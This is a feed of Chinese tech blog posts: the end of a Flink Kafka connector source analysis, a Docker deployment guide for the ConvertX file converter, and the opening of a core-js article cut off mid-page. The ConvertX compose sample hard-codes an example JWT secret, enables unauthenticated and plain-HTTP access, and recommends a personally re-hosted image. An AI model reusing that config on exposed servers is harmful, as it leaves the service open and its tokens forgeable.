    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SINK_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSink(
            physicalDataType,
            keyEncodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueEncodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            getKafkaProperties(context.getCatalogTable().getOptions()),
            getFlinkKafkaPartitioner(tableOptions, context.getClassLoader()).orElse(<span class="hljs-literal">null</span>),
            deliveryGuarantee,
            parallelism,
            tableOptions.get(TRANSACTIONAL_ID_PREFIX),
            tableOptions.get(TRANSACTION_NAMING_STRATEGY));
}
</code></pre>
<p>和 Source 的流程很相似，这里首先是获取 key 和 value 的编码格式，然后做了很多校验，最后是创建 KafkaDynamicSink 实例。</p>
<p>获取编码格式用到的工厂类是 SerializationFormatFactory，我们前面介绍的 JsonFormatFactory 也实现了 SerializationFormatFactory，因此它既提供了解码格式，又提供了编码格式。编码格式用到的编码器是 JsonRowDataSerializationSchema，通过 RowDataToJsonConverters 将 RowData 转换成 JsonNode。</p>
<p>在 KafkaDynamicSink 的 getSinkRuntimeProvider 方法中，主要就是创建 KafkaSink 实例。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/854b4c2fdee4487994510627457e8c5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=WYK4ar2fAKGW1M8Hpkh%2BmUxLcB4%3D" alt="KafkaSink" loading="lazy"/></p>
<p>KafkaSink 类实现了 TwoPhaseCommittingStatefulSink 接口，即支持两阶段提交。它创建了 KafkaWrter 和 KafkaCommiter。</p>
<p>创建 KafkaWriter 时，如果配置的是 ExactlyOnce 模式，则会创建出 ExactlyOnceKafkaWriter，否则创建 KafkaWriter。Writer 真正实现两阶段提交的是 ExactlyOnceKafkaWriter。它在启动时，会调用 <code>producer.beginTransaction</code> 开启一个事务。数据写入时会调用 <code>KafkaWriter.write</code> 方法，此操作会被标记为事务内的操作。当 Sink 收到 Barrier 时，会先调用 flush 方法，将缓冲区的数据都发送到 Kafka Broker，然后调用 prepareCommit 方法预提交。预提交方法中记录 epoch 和 transactionalId 返回给框架层。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Collection&lt;KafkaCommittable&gt; <span class="hljs-title function_">prepareCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// only return a KafkaCommittable if the current transaction has been written some data</span>
    <span class="hljs-keyword">if</span> (currentProducer.hasRecordsInTransaction()) {
        <span class="hljs-type">KafkaCommittable</span> <span class="hljs-variable">committable</span> <span class="hljs-operator">=</span> KafkaCommittable.of(currentProducer);
        LOG.debug(<span class="hljs-string">"Prepare {}."</span>, committable);
        currentProducer.precommitTransaction();
        <span class="hljs-keyword">return</span> Collections.singletonList(committable);
    }

    <span class="hljs-comment">// otherwise, we recycle the producer (the pool will reset the transaction state)</span>
    producerPool.recycle(currentProducer);
    <span class="hljs-keyword">return</span> Collections.emptyList();
}
</code></pre>
<p>状态保存时，会将预提交的 transactionalId 存到状态中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> IOException {
    <span class="hljs-comment">// recycle committed producers</span>
    TransactionFinished finishedTransaction;
    <span class="hljs-keyword">while</span> ((finishedTransaction = backchannel.poll()) != <span class="hljs-literal">null</span>) {
        producerPool.recycleByTransactionId(
                finishedTransaction.getTransactionId(), finishedTransaction.isSuccess());
    }
    <span class="hljs-comment">// persist the ongoing transactions into the state; these will not be aborted on restart</span>
    Collection&lt;CheckpointTransaction&gt; ongoingTransactions =
            producerPool.getOngoingTransactions();
    currentProducer = startTransaction(checkpointId + <span class="hljs-number">1</span>);
    <span class="hljs-keyword">return</span> createSnapshots(ongoingTransactions);
}

<span class="hljs-keyword">private</span> List&lt;KafkaWriterState&gt; <span class="hljs-title function_">createSnapshots</span><span class="hljs-params">(
        Collection&lt;CheckpointTransaction&gt; ongoingTransactions)</span> {
    List&lt;KafkaWriterState&gt; states = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span>[] subtaskIds = <span class="hljs-built_in">this</span>.ownedSubtaskIds;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; index &lt; subtaskIds.length; index++) {
        <span class="hljs-type">int</span> <span class="hljs-variable">ownedSubtask</span> <span class="hljs-operator">=</span> subtaskIds[index];
        states.add(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaWriterState</span>(
                        transactionalIdPrefix,
                        ownedSubtask,
                        totalNumberOfOwnedSubtasks,
                        transactionNamingStrategy.getOwnership(),
                        <span class="hljs-comment">// new transactions are only created with the first owned subtask id</span>
                        index == <span class="hljs-number">0</span> ? ongoingTransactions : List.of()));
    }
    LOG.debug(<span class="hljs-string">"Snapshotting state {}"</span>, states);
    <span class="hljs-keyword">return</span> states;
}
</code></pre>
<p>当 Checkpoint 完成时，会调用 <code>KafkaCommitter.commit</code> 方法。在 commit 方法中会调用 <code>producer.commitTransaction</code> 正式提交事务。</p>
<p>FlinkKafkaInternalProducer 是 Flink 内部封装的与 Kafka 生产者的交互类，所有与 Kafka 生产者的交互都通过它执行。</p>
<p>关于 Kafka Connector 的 Sink 端的源码我们就梳理到这里。</p>
<h3 data-id="heading-9">总结</h3>
<p>最后还是总结一下。本文我们先了解了 Flink 中自定义 Source 和 Sink 的流程。按照这个流程，我们梳理了 Kafka Connector 的源码。在 Source 端，Flink Kafka 封装了对消费者 Offset 的提交逻辑。在 Sink 端结合了 Kafka 提供的事务支持实现了两阶段提交的逻辑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ConvertX:一站式自托管在线文件转换平台,支持上千种格式]]></title>    <link>https://juejin.cn/post/7597283981185302580</link>    <guid>https://juejin.cn/post/7597283981185302580</guid>    <pubDate>2026-01-20T15:27:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185302580" data-draft-id="7597326073671696399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ConvertX:一站式自托管在线文件转换平台,支持上千种格式"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-01-20T15:27:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ConvertX:一站式自托管在线文件转换平台,支持上千种格式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:48.000Z" title="Tue Jan 20 2026 15:27:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你是否曾经为了转换一个文件格式，在电脑上安装各种臃肿的软件，或者将敏感文件上传到第三方在线转换网站？如果你正在寻找一个既能保护隐私、又能满足多样化转换需求的自托管解决方案，那么 <strong>ConvertX</strong> 就是为你量身打造的工具。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15f6b2448cc9445f9d75f3b7a3f5422c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=lL6fsv%2F5SE66WalF0UHKsf9psT8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">💥什么是 ConvertX？</h2>
<p>ConvertX 是一个功能强大的自托管在线文件转换器。它最大的亮点是 <strong>支持超过一千种不同的文件格式转换</strong>，涵盖了文档、图像、视频、电子书、3D模型等多种类型。该项目采用 TypeScript、Bun 和 Elysia 等现代技术栈开发，旨在为用户提供一个安全、高效、可完全掌控的本地化文件处理中心。</p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX" ref="nofollow noopener noreferrer">github.com/C4illin/Con…</a></p>
<p>该项目在github 已有15.3k ⭐star</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd5050a58bae45e2b6d5def2beb1f798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=%2F6IX8CnFDJs6nnPqDKgI%2Bi%2BtU%2F0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">☀️ 核心特性</h2>
<ul>
<li><strong>海量格式支持：</strong> 支持上千种格式互转，几乎能满足所有日常及专业需求。</li>
<li><strong>批量处理：</strong> 可以一次性上传并转换多个文件，显著提升工作效率。</li>
<li><strong>隐私安全：</strong> 自托管意味着你的文件数据永远不会离开你自己的服务器，非常适合处理敏感或机密文档。</li>
<li><strong>多用户账户：</strong> 支持为团队成员或家庭成员创建独立的账户，共享服务又保持个人文件历史隔离。</li>
<li><strong>开源免费：</strong> 完全开源，代码透明，可自由部署和修改。</li>
</ul>
<h2 data-id="heading-2">🎠强大的转换引擎阵容</h2>
<p>ConvertX 的强大能力源于其背后整合的众多业界知名的开源转换工具，它们共同构成了一个超级转换工厂：</p>

































































<table><thead><tr><th>工具</th><th>用途</th><th>支持输入格式数</th><th>支持输出格式数</th></tr></thead><tbody><tr><td><strong>FFmpeg</strong></td><td>音视频处理</td><td>~472种</td><td>~199种</td></tr><tr><td><strong>ImageMagick / GraphicsMagick</strong></td><td>图像处理</td><td>412种</td><td>313种</td></tr><tr><td><strong>LibreOffice</strong></td><td>办公文档</td><td>41种</td><td>22种</td></tr><tr><td><strong>Pandoc</strong></td><td>文档格式（如Markdown）</td><td>43种</td><td>65种</td></tr><tr><td><strong>Calibre</strong></td><td>电子书</td><td>26种</td><td>19种</td></tr><tr><td><strong>Inkscape</strong></td><td>矢量图形</td><td>7种</td><td>17种</td></tr><tr><td><strong>Assimp</strong></td><td>3D模型资产</td><td>77种</td><td>23种</td></tr><tr><td><strong>Vips / libheif / libjxl</strong></td><td>高性能图像与HEIF/JPEG XL格式</td><td>58种</td><td>38种</td></tr><tr><td>... 以及更多</td><td>包括 SVG、LaTeX、Outlook邮件、联系人文件等</td><td/><td/></tr></tbody></table>
<p>这个列表清晰地展示了 ConvertX 的格式覆盖广度。无论是常见的 <code>.pdf</code>、<code>.docx</code>、<code>.mp4</code>、<code>.jpg</code>，还是相对小众的格式，它都有很大可能支持。</p>
<h2 data-id="heading-3">🏍️快速部署指南</h2>
<p>使用 Docker 部署 ConvertX 是极其简单的过程，只需几分钟即可拥有自己的转换服务。</p>
<ol>
<li><strong>准备 <code>docker-compose.yml</code> 文件：</strong></li>
</ol>

<pre><code class="hljs language-ini" lang="ini">services:
  convertx:
  <span class="hljs-comment"># 此服务的镜像3.59GB，国内下载比较慢，需要的家人们可以使用我转存阿里云镜像仓库的镜像</span>
    image: registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx
    container_name: convertx
    restart: unless-stopped
    ports:
      - "10000:3000"
    environment: 
      - <span class="hljs-attr">ACCOUNT_REGISTRATION</span>=<span class="hljs-literal">false</span> <span class="hljs-comment"># true或false，首账户创建不受影响（例如若只需单账户可保持false）</span>
      - <span class="hljs-attr">JWT_SECRET</span>=aLongAndSecretStringUsedToSignTheJSONWebToken1234 <span class="hljs-comment"># 默认使用randomUUID()生成</span>
      - <span class="hljs-attr">HTTP_ALLOWED</span>=<span class="hljs-literal">true</span> <span class="hljs-comment"># 若要使用http访问，则设置为true</span>
      - <span class="hljs-attr">ALLOW_UNAUTHENTICATED</span>=<span class="hljs-literal">true</span>  <span class="hljs-comment"># 允许未登录用户使用服务，仅限本地环境设为true</span>
      - <span class="hljs-attr">AUTO_DELETE_EVERY_N_HOURS</span>=<span class="hljs-number">24</span> <span class="hljs-comment"># 每N小时检查并删除超过N小时的旧文件，设为0可禁用</span>
    volumes:
      - ./data:/app/data
</code></pre>
<p>🐳<strong>Docker 镜像</strong></p>
<p>每次发布时会更新 <code>:latest</code> 标签，每次推送到主分支时会更新 <code>:main</code> 标签。常规使用推荐使用 <code>:latest</code> 标签。</p>
<p>镜像可在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fpkgs%2Fcontainer%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX/pkgs/container/ConvertX" ref="nofollow noopener noreferrer">GitHub Container Registry</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Fr%2Fc4illin%2Fconvertx" target="_blank" title="https://hub.docker.com/r/c4illin/convertx" ref="nofollow noopener noreferrer">Docker Hub</a> 获取。</p>

























<table><thead><tr><th>镜像</th><th>说明</th></tr></thead><tbody><tr><td><code>image: ghcr.io/c4illin/convertx</code></td><td>GitHub Container Registry 上的最新发布版本</td></tr><tr><td><code>image: ghcr.io/c4illin/convertx:main</code></td><td>GitHub Container Registry 上的最新提交</td></tr><tr><td><code>image: c4illin/convertx</code></td><td>Docker Hub 上的最新发布版本</td></tr><tr><td><code>image: c4illin/convertx:main</code></td><td>Docker Hub 上的最新提交</td></tr></tbody></table>
<p>此服务的镜像3.59GB，国内下载比较慢，需要的家人们可以使用我转存阿里云镜像仓库的镜像<code>registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx</code></p>
<ol start="2">
<li>
<p><strong>启动服务：</strong></p>
<p>在 <code>docker-compose.yml</code> 文件所在目录下运行：</p>
</li>
</ol>

<pre><code class="hljs">docker-compose up -d
</code></pre>
<p>3.  <strong>初始化账户：</strong> 在浏览器中访问 <code>http://你的服务器IP:3000</code>。<strong>第一个注册的用户将自动成为管理员</strong>。</p>
<p>就这么简单！你已经成功搭建了一个功能完备的在线文件转换平台。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea5e412ffef949c0b361cf4a406093d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=GGHqYDL9Q1atciNfvU7RE%2FWxW2A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e959a7762eb45e7bf30d155dc3f513e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=n5K9tEYwr%2FdvSY%2BM79RURKu%2BsRQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">🛞环境变量</h3>
<p>所有变量均为可选，但建议设置 JWT_SECRET。</p>






































































<table><thead><tr><th>变量名</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>JWT_SECRET</td><td>未设置时使用 randomUUID() 生成的值</td><td>用于签名 JSON Web Token 的长而保密的字符串</td></tr><tr><td>ACCOUNT_REGISTRATION</td><td>false</td><td>是否允许用户注册账户</td></tr><tr><td>HTTP_ALLOWED</td><td>false</td><td>是否允许 HTTP 连接，仅在本地环境中设置为 true</td></tr><tr><td>ALLOW_UNAUTHENTICATED</td><td>false</td><td>是否允许未认证用户使用服务，仅在本地环境中设置为 true</td></tr><tr><td>AUTO_DELETE_EVERY_N_HOURS</td><td>24</td><td>每隔 n 小时检查并删除超过 n 小时的文件，设置为 0 以禁用</td></tr><tr><td>WEBROOT</td><td/><td>根路径地址，例如设置为 "/convert" 后，网站将通过 "example.com/convert/" 访问</td></tr><tr><td>FFMPEG_ARGS</td><td/><td>传递给 ffmpeg 输入文件的参数，例如 <code>-hwaccel vaapi</code>。有关硬件加速的更多信息，请参阅 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fissues%2F190%25E3%2580%2582" target="_blank" title="https://github.com/C4illin/ConvertX/issues/190%E3%80%82" ref="nofollow noopener noreferrer">github.com/C4illin/Con…</a></td></tr><tr><td>FFMPEG_OUTPUT_ARGS</td><td/><td>传递给 ffmpeg 输出文件的参数，例如 <code>-preset veryfast</code></td></tr><tr><td>HIDE_HISTORY</td><td>false</td><td>是否隐藏历史记录页面</td></tr><tr><td>LANGUAGE</td><td>en</td><td>用于格式化日期字符串的语言，需使用 [BCP 47 语言标签] 指定</td></tr><tr><td>UNAUTHENTICATED_USER_SHARING</td><td>false</td><td>是否在所有未认证用户之间共享转换历史记录</td></tr><tr><td>MAX_CONVERT_PROCESS</td><td>0</td><td>允许的最大并发转换进程数。设置为 0 表示无限制。</td></tr></tbody></table>
<h2 data-id="heading-5">🌅总结</h2>
<p><strong>ConvertX 完美地解决了一个核心痛点：在保障数据隐私的前提下，提供堪比甚至超越商业云服务的文件格式转换能力。</strong> 无论你是个人用户，想要一个干净、无广告、不限次数的本地转换工具；还是团队或组织，需要在内网部署一个安全的文件处理服务，ConvertX 都是一个极具吸引力的选择。</p>
<p>其基于 Docker 的一键式部署、详尽的配置选项和活跃的开源生态，使得从试用、部署到长期维护都变得非常轻松。如果你厌倦了在多个在线转换网站间跳转，或是对云服务的数据安全心存顾虑，不妨现在就尝试部署一个属于你自己的 ConvertX。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d73106e49464640808061ad601a1975~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=EcJVtGJWS5pP1yYFOojreSlynl0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略]]></title>    <link>https://juejin.cn/post/7597258378590846986</link>    <guid>https://juejin.cn/post/7597258378590846986</guid>    <pubDate>2026-01-20T15:57:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590846986" data-draft-id="7597317683051429897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略"/> <meta itemprop="keywords" content="前端,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T15:57:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="漂流瓶jz"/> <meta itemprop="url" content="https://juejin.cn/user/3694779980078877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3694779980078877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    漂流瓶jz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:57:09.000Z" title="Tue Jan 20 2026 15:57:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 